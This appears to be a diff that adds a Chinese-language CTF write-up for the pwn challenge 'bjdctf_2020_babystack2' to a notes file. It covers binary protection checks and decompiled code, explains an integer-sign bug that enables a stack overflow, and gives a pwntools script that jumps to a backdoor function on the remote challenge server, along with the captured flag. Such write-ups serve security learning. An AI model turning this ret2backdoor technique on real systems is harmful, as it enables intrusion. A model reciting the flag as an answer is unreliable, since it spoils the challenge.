@@ -2410,6 +2410,74 @@ io.interactive()
 
 ------
 
+### bjdctf_2020_babystack2
+
+先`file ./bjdctf_2020_babystack2 `查看文件类型，再`checksec --file=./bjdctf_2020_babystack2 `检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ file ./bjdctf_2020_babystack2           
+./bjdctf_2020_babystack2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=98383c4b37ec43aae16b46971bd5ead3f03ce0a6, not stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ checksec --file=./bjdctf_2020_babystack2
+[*] '/home/tyd/ctf/pwn/buuctf/bjdctf_2020_babystack2'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+`NX enabled`开启栈不可执行，用`IDA Pro 64bit`打开附件`./bjdctf_2020_babystack2`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf[12]; // [rsp+0h] [rbp-10h] BYREF
+  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF
+
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 1, 0LL);
+  LODWORD(nbytes) = 0;
+  puts("**********************************");
+  puts("*     Welcome to the BJDCTF!     *");
+  puts("* And Welcome to the bin world!  *");
+  puts("*  Let's try to pwn the world!   *");
+  puts("* Please told me u answer loudly!*");
+  puts("[+]Are u ready?");
+  puts("[+]Please input the length of your name:");
+  __isoc99_scanf("%d", &nbytes);
+  if ( (int)nbytes > 10 )
+  {
+    puts("Oops,u name is too long!");
+    exit(-1);
+  }
+  puts("[+]What's u name?");
+  read(0, buf, (unsigned int)nbytes);
+  return 0;
+}
+```
+
+程序首先输入`size_t`型的`nbytes`，如果这个无符号整数强制转换成`int`型后大于`10`就终止程序，否则`nbytes`为下一次输入的最大长度限制。`read`函数向`buf`变量中写入不超过`nbytes`字节的数据。
+
+当第一次输入`-1`时就能造成栈溢出漏洞，编写`Python`代码求解得到`flag{8cdd2ef8-b593-4974-8dcf-a8eb632145e6}`。
+
+```python
+from pwn import *
+
+io = remote('node4.buuoj.cn', 29944)
+elf = ELF('./bjdctf_2020_babystack2')
+backdoor = elf.symbols['backdoor']
+io.recv()
+io.sendline(b'-1')
+payload = b'a'*0x18 + p64(backdoor)
+io.sendlineafter(b"[+]What's u name?", payload)
+io.interactive()
+```
+
+------
+
 ### pwn2_sctf_2016
 
 先`file ./pwn2_sctf_2016`查看文件类型，再`checksec --file=./pwn2_sctf_2016`检查文件保护情况。
